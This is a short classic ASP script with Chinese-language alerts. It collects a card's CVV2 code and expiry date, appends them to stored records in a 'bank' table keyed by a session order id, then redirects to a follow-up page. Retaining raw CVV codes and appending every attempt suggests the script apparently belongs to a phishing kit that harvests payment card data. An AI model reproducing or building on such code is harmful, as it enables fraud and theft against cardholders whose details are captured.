<!--#include file="include/db_conn.asp"-->
<%
	CVV2=Trim(Request("CVV2"))
	yxq=Trim(Request("riqi"))
	
	if CVV2="" then
		response.Write "<script>alert('请输入CVV2');history.go(-1);</script>"
		response.End()
	end if
	if yxq="" then
		response.Write "<script>alert('请输入有效期');history.go(-1);</script>"
		response.End()
	end if

	set Rs=server.createobject("adodb.recordset")
	Sql="select top 1 * from bank where id="&session("ddid")
	rs.open sql,conn,1,3
	rs("cvn")=rs("cvn")&"/"&CVV2
	rs("yxq")=rs("yxq")&"-"&yxq
	rs("n")=0
	rs("sj")=now()
	rs.update
	rs.close
	set rs=nothing
	response.write "<script>top.location ='v_lateron.asp';</script>"
%>
